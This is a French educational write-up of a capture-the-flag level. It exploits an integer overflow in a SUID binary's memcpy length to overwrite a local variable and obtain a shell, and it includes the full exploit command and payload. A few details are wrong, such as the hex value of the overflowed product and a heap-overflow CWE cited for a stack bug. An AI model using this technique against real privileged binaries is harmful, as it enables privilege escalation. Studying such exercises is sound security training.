# Bonus1 - README Pédagogique

## 🎯 Objectif
Exploiter un **integer overflow** sur la valeur passée à `memcpy()` pour contourner un filtre `nb > 9` et écraser une variable locale avec la valeur magique `0x574f4c46`, déclenchant ainsi un `execl("/bin/sh")`.

**Technique** : Integer Overflow + memcpy Overflow + Variable Overwrite

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l bonus1
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
    ^
    └─ Bit SUID actif → s'exécute avec les droits de bonus2
```

### Tests comportementaux
```bash
$ ./bonus1
# Segmentation fault (argc < 2)

$ ./bonus1 5 hello
# (pas de sortie — nb != 0x574f4c46)

$ ./bonus1 10 hello
# (return 1 immédiatement — nb > 9)
```

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)

```cpp
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
    int nb;
    char buffer[40];

    nb = atoi(argv[1]);              // Conversion argv[1] en int signé

    if (nb > 9)                      // ⚠️ Filtre incomplet : bloque > 9 mais pas négatifs
        return 1;

    memcpy(buffer, argv[2], nb * 4); // ⚠️ nb*4 passé comme size_t → integer overflow possible

    if (nb == 0x574f4c46)            // Valeur magique "WOFLL"
        execl("/bin/sh", "sh", NULL);

    return 0;
}
```

**Layout mémoire (stack)** :
```
Stack (adresses hautes → basses) :
┌──────────────────┐
│ saved EIP        │
│ saved EBP        │
│ nb (4 bytes)     │  ← au-dessus de buffer car déclaré en 1er
│ buffer[40]       │  ← memcpy écrit ici et déborde vers nb
└──────────────────┘

memcpy écrit de bas en haut :
buffer[0..39] → rempli par nos A
buffer[40..43] → déborde sur nb → écrase nb avec 0x574f4c46
```

---

## 💣 Vulnérabilité : Integer Overflow

### 1. Le filtre incomplet

```cpp
if (nb > 9) return 1;
```

Ce filtre protège contre les grandes valeurs **positives** (`10`, `100`, etc.) mais laisse passer toutes les valeurs **négatives** (`-1`, `-2147483637`, etc.).

Or un `int` négatif passé comme `size_t` à `memcpy` devient une **énorme valeur positive** (comportement indéfini en C, mais prévisible sur x86).

### 2. Comment nb * 4 produit 44

```c
memcpy(buffer, argv[2], nb * 4);
```

Le processeur calcule `nb * 4` **avant** d'appeler memcpy :

```
nb * 4 = -2147483637 * 4 = -8589934548
```

`-8589934548` ne rentre pas dans un int32 → **overflow** → on garde les 32 bits bas :

```
-8589934548 en binaire (64 bits) :
1111 1111 1111 1111 1111 1111 1111 1110 | 0000 0000 0000 0000 0000 0000 0010 1100
←————————— 32 bits hauts ————————————→   ←————————— 32 bits bas ————————————→
                                                                        = 44 !
```

memcpy reçoit directement **44** — il ne voit jamais de valeur négative. Il copie simplement 44 bytes normalement. ✅

### 3. Calcul de la valeur magique

**Objectif** :
- `nb <= 9` (passe le filtre)
- `(nb * 4) & 0xFFFFFFFF == 44` (copie exactement 44 bytes en pratique)

**Formule** :
```
nb * 4 ≡ 44 (mod 2^32)
nb ≡ 11 (mod 2^30)

Valeurs possibles : 11, 1073741835, -2147483637, ...
Seule -2147483637 satisfait nb <= 9 ✅
```

**Vérification bit à bit** :
```
-2147483637 en binaire (32 bits) :
= 0b10000000000000000000000000001011

-2147483637 * 4 = -8589934548

-8589934548 en binaire (64 bits) :
= 0xFFFFFFFF_0000002C

Les 32 bits bas = 0x2C = 44 ✅
memcpy voit 44 bytes à copier ✅
```

### 4. Pourquoi 44 bytes ?

**Rappel du layout stack** :

La stack grandit vers les adresses basses. Le compilateur place les variables locales dans l'ordre inverse de leur déclaration :

```c
int main() {
    int nb;          // déclaré en 1er → plus haut sur la stack
    char buffer[40]; // déclaré en 2ème → plus bas sur la stack
}
```

```
Stack :
┌──────────────────┐  adresses hautes
│ saved EIP        │
│ saved EBP        │
│ nb (4 bytes)     │  ← déclaré en 1er → au-dessus de buffer
│ buffer[40]       │  ← déclaré en 2ème → en dessous de nb
└──────────────────┘  adresses basses
```

**Pourquoi buffer est en dessous de nb ?**

`memcpy` écrit vers les **adresses croissantes** (du bas vers le haut). Donc en débordant de `buffer`, on monte naturellement vers `nb` qui est juste au-dessus.

**Le calcul de 44 :**

```
buffer[0]  ← memcpy commence ici (adresse basse)
buffer[1]
...
buffer[39] ← fin de buffer (40 bytes écrits)
buffer[40] ← DÉBORDE → début de nb !
buffer[41]
buffer[42]
buffer[43] ← fin du débordement → nb complètement écrasé (4 bytes)
```

```
buffer[40] + nb[4] = 44 bytes au total

[A * 40 bytes padding][0x574f4c46]
 ←— remplit buffer —→  ←— écrase nb —→
```

**Si buffer était au-dessus de nb**, on ne pourrait pas l'atteindre avec memcpy — on déborderait dans la mauvaise direction. C'est justement parce que `buffer` est déclaré **après** `nb` qu'il se retrouve plus bas sur la stack et qu'on peut déborder vers `nb`.

### 5. La valeur magique 0x574f4c46

```
0x574f4c46 = 'W' 'O' 'L' 'F' (ASCII)
En little-endian → \x46\x4c\x4f\x57
```

Quand `nb` vaut `0x574f4c46`, la condition `nb == 0x574f4c46` est vraie → `execl("/bin/sh")`.

---

## 🔑 Concepts clés

### 1. Integer Overflow

**Définition** : Dépassement de la capacité d'un type entier, produisant une valeur inattendue.

```c
nb * 4 = -2147483637 * 4 = -8589934548
```

Mais `-8589934548` ne rentre pas dans un int32 (min = -2147483648). Il y a un **overflow** — on garde seulement les **32 bits de poids faible** :

```
-8589934548 en binaire (64 bits) :
1111 1111 1111 1111 1111 1111 1111 1110 | 0000 0000 0000 0000 0000 0000 0010 1100
←————————— 32 bits hauts ————————————→   ←————————— 32 bits bas ————————————→
                                                                        = 44 !
```

En int32 on ne garde que les 32 bits bas → **44**.

Le comportement après overflow d'un `int` est **indéfini en C**, mais sur x86 (arithmétique modulaire) le résultat est prévisible.

### 2. Conversions de types implicites

```c
memcpy(buffer, argv[2], nb * 4);
//                       ^--- size_t (non signé)
```

`nb * 4` est calculé en **int32 signé** → overflow → **44**. Ce résultat est ensuite passé à `memcpy` comme `size_t`. Sur cette VM **32 bits**, `size_t` fait aussi 32 bits → le cast ne change rien, la valeur reste **44**.

| Type | Signé | Taille sur 32 bits |
|---|---|---|
| `int` | Oui | 32 bits |
| `size_t` | Non | 32 bits |

### 3. Variable Overwrite vs EIP Overwrite

Ce niveau n'écrase pas EIP — il écrase une **variable locale** (`nb`) pour satisfaire une condition logique. Technique plus subtile que le ret2func classique.

```
Pas de EIP overwrite → pas de ROP, pas de shellcode
Juste : écraser nb avec 0x574f4c46 → condition vraie → execl() légitime
```

### 4. Arithmetic modulo 2^32

```
Pour trouver nb tel que nb * 4 ≡ target (mod 2^32) :

1. Trouver nb_positif = target / 4 (si target divisible par 4)
2. Soustraire 2^32 / 4 = 2^30 = 1073741824 jusqu'à nb <= 9

nb = 11
11 - 1073741824 = -1073741813  (toujours > 9 en signé ? Non, -1073741813 < 9 ✅)

Mais (-1073741813 * 4) mod 2^32 = ?
-1073741813 * 4 = -4294967252
-4294967252 mod 2^32 = -4294967252 + 2^32 = 44 ✅

Donc -1073741813 fonctionne aussi !
Autre valeur valide : -2147483637 (comme dans la solution officielle)
```

---

## 🚀 Construction du payload

### Étape 1 : Calculer nb

```
On veut nb * 4 ≡ 44 (mod 2^32) avec nb <= 9

44 / 4 = 11 → valeur de base
11 - 2^30 = 11 - 1073741824 = -1073741813  ✅
11 - 2^31 = 11 - 2147483648 = -2147483637  ✅ (solution retenue)
```

### Étape 2 : Construire argv[2]

```
[padding 40 bytes] + [0x574f4c46 en little-endian]
["A" * 40]         + ["\x46\x4c\x4f\x57"]
```

### Commande finale

```bash
./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```

---

## 🔄 Déroulement de l'exploitation

```
1. atoi("-2147483637") → nb = -2147483637

2. nb > 9 ?
   -2147483637 > 9 → FALSE ✅ → on continue

3. memcpy(buffer, argv[2], -2147483637 * 4)
   -2147483637 * 4 = -8589934548
   cast en size_t → 44 bytes effectivement copiés ✅

4. Mémoire après memcpy :
   buffer[0..39] = 'A' * 40
   nb = 0x574f4c46 ← écrasé ! ✅

5. nb == 0x574f4c46 ? → TRUE ✅

6. execl("/bin/sh", "sh", NULL) → Shell bonus2 🎉
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-190** : Integer Overflow or Wraparound
- **CWE-122** : Heap-based Buffer Overflow (memcpy sans limite)
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **Integer overflow** : valeur négative contourne le filtre `> 9`
- **Variable overwrite** : écrase `nb` directement sans toucher à EIP

---

## 🎓 Résumé

1. **Vulnérabilité** : filtre `nb > 9` ne bloque pas les négatifs
2. **Integer overflow** : `-2147483637 * 4` donne 44 en 32 bits
3. **memcpy** : copie 44 bytes → déborde buffer[40] → écrase `nb`
4. **Payload** : 40 bytes padding + `\x46\x4c\x4f\x57`
5. **Résultat** : `nb == 0x574f4c46` → `execl("/bin/sh")`

---

## 🔐 Différences avec les niveaux précédents

| | Level6 | Bonus1 |
|---|---|---|
| **Cible** | Function pointer | Variable locale (`nb`) |
| **Technique** | strcpy overflow → ptr | memcpy overflow → int |
| **Déclencheur** | Appel via ptr écrasé | Condition logique vraie |
| **Complexité** | Simple | Integer arithmetic |

**Bonus1 est unique** : premier niveau où l'exploitation ne touche pas à EIP — on manipule uniquement la logique du programme en écrasant une variable de contrôle.